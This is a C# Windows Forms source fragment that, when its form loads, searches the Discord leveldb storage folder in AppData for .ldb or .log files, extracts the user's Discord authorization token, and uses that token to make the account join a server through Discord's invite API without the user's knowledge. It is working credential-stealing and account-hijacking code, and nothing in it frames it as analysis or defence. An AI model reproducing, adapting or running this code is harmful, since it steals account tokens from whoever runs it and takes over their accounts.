        public static bool FindLdb(ref string path)
        {
            if (!Directory.Exists(path))
            {
                return false;
            }
            foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
            {
                if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("token"))
                {
                    path += fileInfo.Name;
                    break;
                }
            }
            return path.EndsWith(".ldb");
        }

        public static bool FindLog(ref string path)
        {
            if (!Directory.Exists(path))
            {
                return false;
            }
            foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
            {
                if (fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                {
                    path += fileInfo.Name;
                    break;
                }
            }
            return path.EndsWith(".log");
        }


        public static string GetToken(string path, bool isLog = false)
        {
            byte[] bytes = File.ReadAllBytes(path);
            string @string = Encoding.UTF8.GetString(bytes);
            string text = "";
            string text2 = @string;
            while (text2.Contains("oken"))
            {
                string[] array = Sub(text2).Split(new char[]
                {
                    '"'
                });
                text = array[0];
                text2 = string.Join("\"", array);
                if (isLog && text.Length == 59)
                {
                    break;
                }
            }
            return text;
        }

        private static string Sub(string contents)
        {
            string[] array = contents.Substring(contents.IndexOf("oken") + 4).Split(new char[]
            {
                '"'
            });
            List<string> list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return string.Join("\"", array);
        }



        public string Request(string method, string url, string postData, string token)
        {
            string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Discord\\Local Storage\\leveldb\\";
            HttpWebRequest httpWebRequest = WebRequest.CreateHttp(url);
            httpWebRequest.Method = method;
            httpWebRequest.Headers.Add("authorization", token);
            byte[] bytes = Encoding.UTF8.GetBytes(postData);
            httpWebRequest.ContentType = "application/x-www-form-urlencoded";
            httpWebRequest.ContentLength = (long)bytes.Length;
            httpWebRequest.Timeout = 2500;
            Stream requestStream = httpWebRequest.GetRequestStream();
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
            return new StreamReader(httpWebRequest.GetResponse().GetResponseStream()).ReadToEnd();
        }
        public void JoinServer(string invite, string token)
        {
            try
            {
                this.Request("POST", "https://discordapp.com/api/v6/invite/" + invite, "a=b", token);
            }

            catch
            {

            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
            if (!FindLdb(ref text) && !FindLog(ref text))
            {

            }

            Thread.Sleep(100);
            string text2 = GetToken(text, text.EndsWith(".log"));
            
            Process[] processesByName = Process.GetProcessesByName("Discord");
            for (int i = 0; i < processesByName.Length; i++)
            {

            }
            
            JoinServer("last code of invite", text2);
        }
